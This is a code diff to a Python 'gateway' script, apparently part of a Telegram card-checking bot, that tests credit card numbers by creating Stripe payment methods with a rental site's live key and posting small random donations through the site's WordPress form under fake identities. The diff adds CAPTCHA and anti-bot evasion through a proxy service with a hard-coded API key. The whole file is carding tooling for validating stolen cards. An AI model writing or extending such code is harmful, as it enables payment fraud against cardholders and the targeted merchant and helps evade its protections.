@@ -1,6 +1,5 @@
 # gatet.py - Boutique Vacation Rentals Stripe Gateway
-# Compatible with bot.py (single string return)
-# Fixed: proxies parameter added
+# ✅ Bright Data Web Unlocker API ကိုသုံးပြီး CAPTCHA အလိုအလျောက်ကျော်
 import requests
 import json
 import time
@@ -9,6 +8,11 @@ import uuid
 from faker import Faker
 
 fake = Faker("en_US")
+
+# ========== BRIGHT DATA WEB UNLOCKER API ==========
+UNLOCKER_API_KEY = "ff6d6cb9-7246-4a29-b567-ff3c25b9569a"
+UNLOCKER_ZONE = "web_unlocker1"
+UNLOCKER_URL = "https://api.brightdata.com/request"
 
 # ========== CLASSIFICATION KEYS ==========
 success_keys = ["appreciate", "Payment Success", "redirect_to", "thank", "Thanks", "redirectUrl", "succeeded", "confirmation", "Successful!", "Successful", "hide_form", "redirect_url", "Merci", "Form entry saved", "Success!", "donation", "complete", "Payment successful"]
@@ -62,17 +66,50 @@ def gen_random_guid():
 def gen_random_phone():
     return f"07{random.randint(10000000, 99999999)}"
 
-# ========== RANDOM AMOUNT GENERATOR ==========
 def gen_random_amount():
     """Random amount between 0.50 and 1.50"""
     cents = random.randint(50, 150)
     return f"{cents // 100}.{cents % 100:02d}"
 
-# ========== MAIN TELE FUNCTION (FIXED) ==========
+# ========== WEB UNLOCKER REQUEST FUNCTION ==========
+def unlocker_request(url, payload, headers, timeout=60):
+    """Send request through Bright Data Web Unlocker - Auto bypass CAPTCHA & anti-bot"""
+    
+    # Build target URL with full payload
+    full_url = f"{url}?{payload}" if payload else url
+    
+    try:
+        # Call Bright Data API
+        response = requests.post(
+            UNLOCKER_URL,
+            headers={
+                "Authorization": f"Bearer {UNLOCKER_API_KEY}",
+                "Content-Type": "application/json"
+            },
+            json={
+                "zone": UNLOCKER_ZONE,
+                "url": full_url,
+                "format": "raw",
+                "method": "POST",
+                "post_data": payload,
+                "headers": headers
+            },
+            timeout=timeout
+        )
+        
+        if response.status_code == 200:
+            return response.text
+        else:
+            return f"UNLOCKER_ERROR:{response.status_code}"
+            
+    except Exception as e:
+        return f"UNLOCKER_ERROR:{str(e)}"
+
+# ========== MAIN TELE FUNCTION ==========
 def Tele(ccx: str, gate: str = "ch1", proxies: dict = None):
     """
-    Check credit card - returns string: "message|amount|time"
-    proxies: optional dict like {"http": "http://...", "https": "http://..."}
+    Check credit card via Boutique Vacation Rentals
+    Uses Bright Data Web Unlocker to bypass CAPTCHA
     """
     start_time = time.time()
     
@@ -87,10 +124,7 @@ def Tele(ccx: str, gate: str = "ch1", proxies: dict = None):
     if len(yy) == 4 and yy.startswith("20"):
         yy = yy[2:4]
 
-    # ===== RANDOM AMOUNT (0.50 - 1.50) =====
     charge_amount = gen_random_amount()
-
-    # Generate fake info
     first_name, last_name = gen_random_name()
     email = gen_random_email(first_name, last_name)
     full_name = f"{first_name} {last_name}"
@@ -104,17 +138,9 @@ def Tele(ccx: str, gate: str = "ch1", proxies: dict = None):
 
     stripe_key = "pk_live_51ODCnuBD8XiDzI9igICxOfdXhUKRPtd7m4dnxVox4wgwab2pxtZ2uGmt2lZzQPHkWsM7U8QwYPEr1m31qVNTvuBf00ZcLWATAo"
 
-    session = requests.Session()
-    # ✅ PROXY FIX: Proxy dict ကို session ထဲထည့်ပေး
-    if proxies:
-        session.proxies.update(proxies)
-        
-    session.cookies.set('__stripe_mid', muid)
-    session.cookies.set('__stripe_sid', sid)
-
-    # ===== STEP 1: Create Payment Method =====
+    # ===== STEP 1: Create Payment Method via Web Unlocker =====
     url_stripe = "https://api.stripe.com/v1/payment_methods"
-    stripe_data = (
+    stripe_payload = (
         f'type=card'
         f'&card[number]={n}'
         f'&card[cvc]={cvc}'
@@ -134,6 +160,7 @@ def Tele(ccx: str, gate: str = "ch1", proxies: dict = None):
         f'&client_attribution_metadata[wallet_config_id]={wallet_config_id}'
         f'&key={stripe_key}'
     )
+    
     headers_stripe = {
         'authority': 'api.stripe.com',
         'accept': 'application/json',
@@ -143,52 +170,36 @@ def Tele(ccx: str, gate: str = "ch1", proxies: dict = None):
         'user-agent': gen_random_user_agent(),
     }
 
+    # Use Web Unlocker for Stripe API
     try:
-        resp = session.post(url_stripe, headers=headers_stripe, data=stripe_data, timeout=30)
-    except Exception as e:
-        elapsed = round(time.time() - start_time, 1)
-        return f"NETWORK_ERROR|{charge_amount}|{elapsed}"
-
-    if resp.status_code != 200:
-        try:
-            err = resp.json().get('error', {})
-            err_msg = err.get('message', resp.text[:200])
-        except:
-            err_msg = resp.text[:200]
-        elapsed = round(time.time() - start_time, 1)
-
-        err_lower = str(err_msg).lower()
-        if 'number' in err_lower and ('incorrect' in err_lower or 'invalid' in err_lower):
-            return f"Your card number is incorrect|{charge_amount}|{elapsed}"
-        if 'cvc' in err_lower or 'cvv' in err_lower:
-            return f"security code is incorrect|{charge_amount}|{elapsed}"
-        if 'expired' in err_lower:
-            return f"card has expired|{charge_amount}|{elapsed}"
-        if 'insufficient' in err_lower:
-            return f"insufficient funds|{charge_amount}|{elapsed}"
-        if 'declined' in err_lower:
-            return f"Your card was declined.|{charge_amount}|{elapsed}"
-        if '3d' in err_lower or 'authentication' in err_lower:
-            return f"3D Secure authentication required|{charge_amount}|{elapsed}"
-        return f"STRIPE_ERROR: {err_msg[:80]}|{charge_amount}|{elapsed}"
-
-    try:
-        resp_json = resp.json()
+        resp_text = unlocker_request(url_stripe, stripe_payload, headers_stripe, timeout=60)
+        
+        if resp_text.startswith("UNLOCKER_ERROR"):
+            elapsed = round(time.time() - start_time, 1)
+            return f"NETWORK_ERROR|{charge_amount}|{elapsed}"
+            
+        resp_json = json.loads(resp_text)
+        
         if 'id' not in resp_json:
             elapsed = round(time.time() - start_time, 1)
             return f"STRIPE_ERROR: No payment method|{charge_amount}|{elapsed}"
+            
         payment_method_id = resp_json['id']
-    except:
+        
+    except json.JSONDecodeError:
         elapsed = round(time.time() - start_time, 1)
         return f"JSON_PARSE_ERROR|{charge_amount}|{elapsed}"
+    except Exception as e:
+        elapsed = round(time.time() - start_time, 1)
+        return f"STRIPE_ERROR: {str(e)[:80]}|{charge_amount}|{elapsed}"
 
-    # ===== STEP 2: Fluent Forms Submit =====
+    # ===== STEP 2: Fluent Forms Submit via Web Unlocker =====
     url_wp = "https://boutiquevacationrentals.cloud/wp-admin/admin-ajax.php"
     datetime_now = f"{random.randint(1,28)}/{random.randint(1,12)}/{random.randint(2026,2027)}"
     datetime_future = f"{random.randint(1,28)}/{random.randint(1,12)}/{random.randint(2026,2027)}"
     numeric = random.randint(1000,9999)
 
-    wp_data = (
+    wp_payload = (
         f'data=__fluent_form_embded_post_id%3D2858'
         f'%26_fluentform_3_fluentformnonce%3Dd625de3bed'
         f'%26_wp_http_referer%3D%252Fpayments%252F'
@@ -217,16 +228,16 @@ def Tele(ccx: str, gate: str = "ch1", proxies: dict = None):
         'X-Requested-With': 'XMLHttpRequest',
     }
 
+    # Use Web Unlocker for WordPress
     try:
-        r2 = session.post(url_wp, data=wp_data, headers=headers_wp, timeout=30)
-    except Exception as e:
+        resp_text = unlocker_request(url_wp, wp_payload, headers_wp, timeout=60)
+        
+        if resp_text.startswith("UNLOCKER_ERROR"):
+            elapsed = round(time.time() - start_time, 1)
+            return f"NETWORK_ERROR|{charge_amount}|{elapsed}"
+            
+        resp_json = json.loads(resp_text)
         elapsed = round(time.time() - start_time, 1)
-        return f"NETWORK_ERROR|{charge_amount}|{elapsed}"
-
-    elapsed = round(time.time() - start_time, 1)
-
-    try:
-        resp_json = r2.json()
 
         if resp_json.get('success') == True:
             return f"Thank you for your donation!|{charge_amount}|{elapsed}"
@@ -265,11 +276,11 @@ def Tele(ccx: str, gate: str = "ch1", proxies: dict = None):
             return f"DEAD - {message[:80]}|{charge_amount}|{elapsed}"
 
     except json.JSONDecodeError:
-        text = r2.text[:200]
-        if "thank" in text.lower():
-            return f"Thank you for your donation!|{charge_amount}|{elapsed}"
-        else:
-            return f"DEAD - {text[:80]}|{charge_amount}|{elapsed}"
+        elapsed = round(time.time() - start_time, 1)
+        return f"DEAD - JSON Error|{charge_amount}|{elapsed}"
+    except Exception as e:
+        elapsed = round(time.time() - start_time, 1)
+        return f"ERROR - {str(e)[:80]}|{charge_amount}|{elapsed}"
 
 
 # ========== TEST ==========
